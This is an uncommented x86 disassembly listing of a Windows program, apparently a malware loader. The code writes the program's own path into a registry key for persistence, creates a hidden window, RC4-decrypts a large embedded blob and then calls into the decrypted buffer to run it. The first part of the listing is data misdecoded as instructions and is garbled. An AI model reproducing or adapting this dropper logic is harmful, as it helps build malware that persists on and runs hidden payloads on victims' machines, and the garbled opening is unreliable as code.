popad
jb rwxdata
je rwxdata
jb rwxdata
popad
and [ fs : ecx + 0x74 ] ah
popad
or eax 0xa0d000a
popad
bound ebp [ esi + 0x6f ]
outsb
jbe rwxdata
popad
and [ fs : edi + ebp * 2 + 0x63 ] ch
imul esp [ eax ] 0x65
jb rwxdata
je rwxdata
inc edx
add [ ecx - 0x60 ] dh
inc edx
add al bh
pop [ edx ]
popad
mov eax [ 0xffffffff9cb30042 ]
inc edx
add al ch
sbb [ edx ] eax
jge rwxdata
jbe rwxdata
mov eax [ edx ]
inc edx
add bh bh
popad
jae rwxdata
jpo rwxdata
arpl [ ecx + ebp * 2 + 0x76 ] si
push edi
imul ebp [ esi + 0x64 ] 0x4d00776f
add [ eax ] al
push edx
jne rwxdata
push esi
add [ eax ] al
jb rwxdata
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
inc edi
je rwxdata
outsb
imul ebp [ esi + 0x74 ] 0x746f6e20
and [ edi + ebp * 2 + 0x61 ] ch
or eax 0xa
inc ebp
jb rwxdata
jne rwxdata
imul esi [ ebx + 0x75 ] 0x43206c61
sub ebp [ ebx ]
and [ edx + 0x75 ] dl
outsb
jb rwxdata
outsw
jb rwxdata
outsd
jb rwxdata
cmp [ 0x75202d0a ] ecx
outsb
popad
bound ebp [ ebp + 0xd ]
or al [ eax ]
add [ eax ] al
add [ edx + 0x36 ] dl
xor [ ecx ] dh
inc edx
add bl cl
mov al [ edx ]

inc edx
add [ esi + ecx * 4 ] dh
inc edx
add [ ecx - 0x72 ] ah
inc edx
add dl dh
mov al [ edx ]
mov ax [ edx ]
inc ecx
add [ edx ] 0xffffffc5
add [ edx ] 0x0
sbb [ edx ] eax
pop esi
nop
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push eax
outsd
jo rwxdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
push eax
sbb al [ edx ]
cdq
nop
inc edx
add [ ecx - 0x74 ] dl
inc edx
add [ edi + 0xd00428d ] al
fwait
add [ eax ] al
popad
inc edx
outsd
js rwxdata
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je rwxdata
outsb
outsd
insd
and [ gs : ecx + ebp * 2 + 0x62 ] cl
jb rwxdata
or cl [ edx ]
add [ eax ] al
add bh bh
outsd
push eax
jb rwxdata
outsb
sub esp [ eax ]
push edx
jne rwxdata
outsb
insd
outsb
je rwxdata
je rwxdata
and [ esi + 0x6f ] ch
or eax 0x6e202d0a
outsd
or al [ eax ]
add [ eax ] al
add [ edx + 0x36 ] dl
xor [ ecx ] dh
inc edx
add [ eax + 0x19 ] dl
inc edx
add [ ebx ] ah
nop
inc edx
add [ eax + 0x42004219 ] bh
nop
inc edx
inc edx
add [ esi - 0x70 ] bl
jo rwxdata
push 0x6c004282
add [ edx ] 0xff
add [ ebp + 0x73 ] dh
jb rwxdata
jae rwxdata
dec ebp
jb rwxdata
jb rwxdata
ja rwxdata
je rwxdata
or al [ eax ]
push edx
add [ edi + 0x65 ] al
je rwxdata
mov eax 0xff004281
xor ch [ esi ]
insb
add [ eax ] al
add [ eax ] al
or cl [ edx ]
add [ eax ] al
add [ eax ] al
jb rwxdata
insd
cmp ah [ eax ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax + esi * 2 ] bh
sub_421658
mov eax 0xb500421a
mov eax [ 0x1b080042 ]
inc edx
add [ edx - 0x5f ] bh
inc edx
add [ eax + 0x1b ] bl
inc edx
add [ ecx + 0x42a1 ] bl
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
test al 0x1b
inc edx
add al dh
mov eax [ 0xffffffff9d260042 ]
inc edx
add [ esi - 0x62 ] ch
inc edx
add [ 0x2500429b ] cl
lahf
inc edx
add [ ebx - 0x61 ] dl
inc edx
add [ esi ] dh
fwait
inc edx
add [ ebp + 0x7600429b ] bh
pop [ edx ]
jno rwxdata
inc edx
add [ 0xffffffffb300429b ] cl
pushfd
inc edx
add bh bh
inc edx
add [ ebx ] dh
mov eax [ 0xffffffffa1610042 ]
inc edx
add [ ebx - 0xfffbd64 ] dh
sbb eax [ edx ]
aam 0xa1
inc edx
add [ esi ] al
fwait
inc edx
add [ esi ] al
fwait
inc edx
add [ 0x1000429b ] cl
fwait
inc edx
add [ 0x3600429b ] dl
fwait
inc edx
add [ ebp + 0x4500429b ] bh
pushfd
inc edx
add [ esp + ebx * 4 + 0x42 ] bh
add ah bl
mov eax [ edx ]
or eax 0xb300429b
pushfd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] dh
inc edx
add [ eax + 0x6e0042a5 ] ch
movsb [ edi ] [ esi ]
inc edx
add [ ebx + 0x690042a5 ] cl
outsd
jae rwxdata
inc edx
add [ ebx - 0x5c ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sbb al 0x42
add [ esi ] ch
inc edx
add [ eax ] al
add [ eax ] eax
add [ edx ] ch
add [ eax ] al
add [ ebx ] al
add [ eax ] al
jo rwxdata
cmp ah [ ebp + 0x6f ]
bound bp [ ecx + 0x74 ]
and [ ebx + 0x65 ] dh
je rwxdata
add [ ebx + 0x74 ] dh
jb rwxdata
inc edx
add [ eax + 0x80042a9 ] ch
sbb eax 0xa98b0042
inc edx
add al bl
sbb eax 0xac7d0042
inc edx
add [ esi - 0x5c ] ch
inc edx
add [ eax - 0x54 ] ah
inc edx
imul ebp [ edi + 0x73 ] 0x61663a3a
imul ebp [ edx + 0x69 ] 0x65732074
je rwxdata
je rwxdata
outsb
and [ si + 0x6f ] dh
outsd
and [ edi + ebp * 2 + 0x6e ] ch
add [ bx + si ] dl
push ds
inc edx
add [ edx + 0x6e0042ab ] ch
movsb [ edi ] [ esi ]
inc edx
add [ eax - 0x55 ] dl
inc edx
add [ eax + 0x1e ] ah
inc edx
add [ ebp - 0x53 ] ah
inc edx
add [ esi - 0x5c ] ch
inc edx
add [ eax - 0x53 ] cl
inc edx
add [ ecx + 0x6e ] ch
jbe rwxdata
add [ eax ] al
add [ ecx + 0x6f ] ch
jae rwxdata
jae rwxdata
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x73 ] ah
insd
loopne rwxdata
add [ eax ] al
add bh bh
insb
imul esp [ eax + 0x73 ] 0x6e697274
and [ bx + si + 0x6f ] dh
jae rwxdata
cmp ah [ edx + 0x61 ]
bound ebp [ fs : ecx + 0x74 ]
and [ ebx + 0x65 ] dh
je rwxdata
push edx
mov esi 0xbe5c0042
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
and [ 0x1993 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
add eax 0x1993
add [ eax ] al
je rwxdata
test al 0x1c
inc edx
add ch dl
movsb [ edi ] [ esi ]
inc edx
add [ esi - 0x5c ] ch
add [ eax ] al
fdivr [ edi + 0x42 ]
add [ eax ] al
mov dh 0xbf
inc edx
add al al
mov edi 0xffff0042
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax + 0x4900421e ] ch
scasd [ edi ]
inc edx
add al bl
push ds
inc edx
add [ ecx - 0x48 ] ah
inc edx
add [ edx ] bl
mov ecx 0x6e550042
imul ebp [ esi + 0x6f ] 0x77
outsb
and [ ebp + 0x78 ] ah
arpl [ ebp + 0x70 ] sp
sub_42198f
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004219 ] al
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cwde
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
or eax 0x19a80042
inc edx
add [ eax ] al
sbb al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
sub_421f44
push ebp
mov ebp esp
sub esp 0x80c
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x80b ]
mov [ ebp - 0x80c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x100
xor eax eax
lea edi [ ebp - 0x40b ]
mov [ ebp - 0x40c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rwxdata
lea eax [ ebp - 0x40c ]
push esi
push eax
call sub_422550
pop ecx
lea eax [ ebp - 0x80c ]
pop ecx
push 0x400
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x80c ]
push eax
lea eax [ ebp - 0x40c ]
push eax
call sub_422550
lea eax [ ebp - 0x40c ]
push esi
push eax
call sub_422550
lea eax [ ebp - 0x40c ]
push eax
call sub_4224c0
mov esi [ RegOpenKeyExA@IAT ]
add esp 0x14
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20006
mov edi rwxdata
push ebx
push edi
push 0x80000002
mov [ ebp - 0x4 ] ebx
call esi
test eax eax
jne rwxdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x20006
push ebx
push edi
push 0x80000001
call esi
test eax eax
jne rwxdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x40c ]
push eax
push 0x1
push ebx
push rwxdata
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
lea eax [ ebp - 0x40c ]
push eax
push 0x1
push ebx
push rwxdata
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
sub_422062
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea eax [ ebp - 0x44 ]
xor esi esi
mov edi rwxdata
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x40 ] sub_42212f
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x44 ] 0x3
call [ RegisterClassA@IAT ]
push esi
push ebx
push esi
push esi
push 0x8
push 0x7
push 0x2
push 0x5
push 0x10000000
push rwxdata
push edi
push esi
call [ CreateWindowExA@IAT ]
mov edi eax
push 0x5
push edi
call [ ShowWindow@IAT ]
push 0x80
push 0x7
push 0x9
push 0x2
push 0x1
push 0xffffffff
push edi
call [ SetWindowPos@IAT ]
push edi
call [ UpdateWindow@IAT ]
mov edi [ GetMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
push rwxdata
call sub_422630
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
jmp rwxdata
call edi
test eax eax
je rwxdata
sub_42212f
push ebp
mov ebp esp
sub esp 0x108
mov eax [ ebp + 0xc ]
push edi
dec eax
dec eax
je rwxdata
and [ ebp - 0x108 ] 0x0
push 0x31
pop ecx
xor eax eax
lea edi [ ebp - 0x107 ]
push rwxdata
[ edi ]
stosb [ edi ]
lea eax [ ebp - 0x108 ]
push eax
call sub_4226c6
pop ecx
pop ecx
push 0x0
call [ PostQuitMessage@IAT ]
sub eax 0x5
je rwxdata
push 0x0
push [ ebp + 0x8 ]
call [ ShowWindow@IAT ]
call sub_422239
jmp rwxdata
sub eax 0x8
je rwxdata
xor eax eax
push ebx
lea eax [ ebp - 0x40 ]
push esi
push eax
push [ ebp + 0x8 ]
call [ BeginPaint@IAT ]
mov esi rwxdata
mov ebx eax
push esi
call sub_4224c0
pop ecx
push eax
push esi
mov esi [ TextOutA@IAT ]
push 0x7
push 0x3
push ebx
call esi
mov edi rwxdata
push edi
call sub_4224c0
pop ecx
push eax
push edi
push 0x6
push 0x2
push ebx
call esi
mov edi rwxdata
push edi
call sub_4224c0
pop ecx
push eax
push edi
push 0x6
push 0x5
push ebx
call esi
mov edi rwxdata
push edi
call sub_4224c0
pop ecx
push eax
push edi
push 0x5
push 0x3
push ebx
call esi
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0x8 ]
call [ EndPaint@IAT ]
pop esi
pop ebx
dec eax
je rwxdata
sub eax 0xf2
je rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp rwxdata
pop edi
leave
retn 0x10
sub_422239
push ebp
mov ebp esp
sub esp 0x144
push ebx
push esi
push edi
push 0x1d12e
mov ebx rwxdata
push rwxdata
push ebx
call sub_422780
push 0x8a
lea eax [ ebp - 0x8c ]
push 0x0
push eax
call sub_422720
lea eax [ ebp - 0x8c ]
push rwxdata
push eax
call sub_4226c6
push 0x9
mov esi rwxdata
push rwxdata
push esi
call sub_42234e
and [ ebp - 0x144 ] 0x0
push 0x2d
pop ecx
xor eax eax
lea edi [ ebp - 0x143 ]
push rwxdata
[ edi ]
lea eax [ ebp - 0x144 ]
push eax
call sub_4226c6
push 0x1d12e
push ebx
push esi
call sub_4222d6
add esp 0x40
call sub_421f44
lea eax [ rwxdata ]
call eax
pop edi
pop esi
pop ebx
leave
retn
sub_4222d6
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
cmp [ ebp + 0x10 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jle rwxdata
leave
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx 0x100
jmp rwxdata
inc eax
mov ecx ebx
cdq
idiv ecx
movzx eax [ edx + edi ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x8 ] edx
lea esi [ edx + edi ]
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
lea eax [ edx + edi ]
push eax
push esi
mov [ ebp - 0xc ] eax
call sub_4223d9
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
pop ecx
movzx edx [ edx ]
pop ecx
mov ecx [ ebp - 0x4 ]
add ecx eax
movzx eax [ esi ]
add eax edx
mov esi ebx
cdq
idiv esi
mov al [ edx + edi ]
xor [ ecx ] al
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jl rwxdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
sub_42234e
push ebp
mov ebp esp
sub esp 0x404
and [ ebp - 0x404 ] 0x0
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
and [ ebp - 0x4 ] eax
lea edi [ ebp - 0x400 ]
[ edi ]
mov edi [ ebp + 0x8 ]
xor ecx ecx
lea ebx [ ebp - 0x404 ]
mov esi 0x100
mov eax ecx
mov [ ecx + edi ] cl
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
inc ecx
movzx eax [ edx + eax ]
mov [ ebx ] eax
add ebx 0x4
cmp ecx esi
jl rwxdata
mov [ ebp + 0x8 ] edi
lea ebx [ ebp - 0x404 ]
mov [ ebp + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov ecx esi
movzx eax [ eax ]
add eax [ ebx ]
add eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] edx
add edx edi
push edx
push [ ebp + 0x8 ]
call sub_4223d9
add ebx 0x4
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
pop ecx
pop ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_42240d
push esi
push [ rwxdata ]
call sub_422fec
mov edx [ rwxdata ]
pop ecx
mov ecx [ rwxdata ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
pop esi
jae rwxdata
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
add [ rwxdata ] 0x4
retn
push edx
call sub_422fec
add eax 0x10
push eax
push [ rwxdata ]
call sub_422c4a
add esp 0xc
test eax eax
jne rwxdata
mov ecx [ rwxdata ]
sub ecx [ rwxdata ]
mov [ rwxdata ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rwxdata ] ecx
retn
sub_42248c
push 0x80
call sub_42304d
test eax eax
pop ecx
mov [ rwxdata ] eax
jne rwxdata
and [ eax ] 0x0
mov eax [ rwxdata ]
mov [ rwxdata ] eax
retn
push 0x18
call sub_422c01
mov eax [ rwxdata ]
pop ecx
sub_4224c0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je rwxdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne rwxdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je rwxdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je rwxdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je rwxdata
jmp rwxdata
sub_422540
push edi
mov edi [ esp + 0x8 ]
jmp rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
test dh dh
je rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_422550
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je rwxdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea edi [ ecx - 0x1 ]
jmp rwxdata
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x4 ]
test ah ah
je rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
lea edi [ ecx - 0x3 ]
jmp rwxdata
test eax 0xff0000
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x2 ]
jmp rwxdata
test eax 0xff000000
je rwxdata
test dh dh
je rwxdata
jmp rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_422630
push ebp
mov ebp esp
sub esp 0x10
push esi
push rwxdata
call sub_423440
pop ecx
xor esi esi
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp ecx esi
jne rwxdata
cmp eax esi
mov [ ebp - 0xc ] rwxdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] esi
je rwxdata
cmp eax esi
jne rwxdata
test [ rwxdata ] 0x80
mov [ ebp - 0x10 ] rwxdata
jne rwxdata
lea ecx [ ebp - 0x10 ]
push esi
push ecx
push eax
push esi
call sub_423262
add esp 0x10
cmp eax 0xffffffff
jne rwxdata
push esi
push eax
call sub_4233fc
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
jmp rwxdata
xor eax eax
jmp rwxdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push [ ebp - 0x10 ]
push esi
call sub_4230ff
add esp 0x10
mov [ ebp - 0x10 ] rwxdata
pop esi
leave
retn
mov ecx [ rwxdata ]
cmp ecx 0x2
je rwxdata
cmp ecx 0xd
jne rwxdata
sub_4226c6
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_4235d2
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js rwxdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_4234bd
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp rwxdata
mov eax esi
pop esi
leave
retn
sub_422720
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je rwxdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb rwxdata
mov [ edi ] al
inc edi
dec edx
jne rwxdata
neg ecx
and ecx 0x3
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je rwxdata
sub edx ecx
[ edi ]
test edx edx
je rwxdata
mov [ edi ] al
inc edi
dec ecx
jne rwxdata
sub_422780
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4227e0 ]
jmp [ ecx * 4 + jump_table_42285c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4228c8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4228c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_422a60 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_422968 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422a60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4228c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4228c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4228c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_422a60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422a60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422a60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422a60 ]
sub_422ab5
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je rwxdata
test al 0x83
je rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax edi
push esi
call sub_423fbb
push esi
mov edi eax
call sub_423f55
push [ esi + 0x10 ]
call sub_423ea2
add esp 0xc
test eax eax
jge rwxdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je rwxdata
or edi 0xffffffff
jmp rwxdata
push eax
call sub_423e39
and [ esi + 0x1c ] 0x0
pop ecx
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
